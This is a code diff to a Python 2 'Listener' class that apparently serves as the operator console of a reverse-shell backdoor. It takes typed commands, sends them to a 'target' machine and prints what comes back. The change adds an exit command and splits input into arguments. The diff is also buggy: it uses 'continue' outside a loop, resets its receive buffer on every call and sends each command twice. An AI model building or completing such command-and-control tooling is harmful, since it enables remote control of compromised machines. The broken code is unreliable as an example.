@@ -39,18 +39,28 @@ class Listener:
 
 
     def reliable_receive(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ''
+        try:
+            json_data += self.connection.recv(1024)
+            return json.loads(json_data)
+        except ValueError:
+            continue
 
 
     def execute_remotely(self, command):
-        self.reliable_send(command)  # sends command to target
+        self.reliable_send(command)
+        if command[0] == 'exit':
+            self.connection.close()     # closes connection
+            exit()                      # exits script
+
+        self.reliable_send(command)     # sends command to target
         return self.reliable_receive()
 
 
     def run(self):
         while True:
             command = raw_input('>> ')
+            command = command.split(' ')
             result = self.execute_remotely(command)
             print(result)
 
